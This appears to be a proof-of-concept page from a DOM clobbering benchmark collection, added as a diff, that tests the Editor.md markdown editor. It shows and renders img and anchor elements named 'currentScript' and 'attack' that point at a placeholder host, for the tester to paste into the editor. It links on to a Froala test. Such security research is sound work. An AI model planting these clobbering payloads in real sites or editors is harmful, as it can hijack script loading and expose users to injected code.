@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - editor</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;currentScript&quot; src=&quot;https://xxx.xxx.xxx&quot;&gt;
+&lt;img name=&quot;attack&quot; src=&quot;https://xxx.xxx.xxx&quot;&gt;
+&lt;a name=&quot;attack&quot; href=&quot;https://xxx.xxx.xxx&quot;&gt;AAA&lt;/a&gt;
+&lt;p&gt;Type the following rendered HTML elements to the editor and check the editor in the debugging console.&lt;/p&gt;</pre>
+  <img name="currentScript" src="https://xxx.xxx.xxx">
+<img name="attack" src="https://xxx.xxx.xxx">
+<a name="attack" href="https://xxx.xxx.xxx">AAA</a>
+<p>Type the following rendered HTML elements to the editor and check the editor in the debugging console.</p>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;link rel=&quot;stylesheet&quot; href=&quot;editor.md/css/editormd.min.css&quot; /&gt;
+&lt;div id=&quot;editor&quot;&gt;
+    &lt;!-- Tips: Editor.md can auto append a `&lt;textarea&gt;` tag --&gt;
+    &lt;textarea style=&quot;display:none;&quot;&gt;### Hello Editor.md !&lt;/textarea&gt;
+&lt;/div&gt;
+&lt;script src=&quot;jquery.min.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;editor.md/editormd.min.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    $(function() {
+        var editor = editormd(&quot;editor&quot;, {
+            // width: &quot;100%&quot;,
+            // height: &quot;100%&quot;,
+            // markdown: &quot;xxxx&quot;,     // dynamic set Markdown text
+            path : &quot;editor.md/lib/&quot;  // Autoload modules mode, codemirror, marked... dependents libs path
+        });
+    });
+&lt;/script&gt;</pre>
+  <link rel="stylesheet" href="editor.md/css/editormd.min.css" />
+<div id="editor">
+    <!-- Tips: Editor.md can auto append a `<textarea>` tag -->
+    <textarea style="display:none;">### Hello Editor.md !</textarea>
+</div>
+<script src="jquery.min.js"></script>
+<script src="editor.md/editormd.min.js"></script>
+<script type="text/javascript">
+    $(function() {
+        var editor = editormd("editor", {
+            // width: "100%",
+            // height: "100%",
+            // markdown: "xxxx",     // dynamic set Markdown text
+            path : "editor.md/lib/"  // Autoload modules mode, codemirror, marked... dependents libs path
+        });
+    });
+</script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../froala/poc.html">Next: froala</a>
+  </div>
+</section>
+
+</body>
+</html>
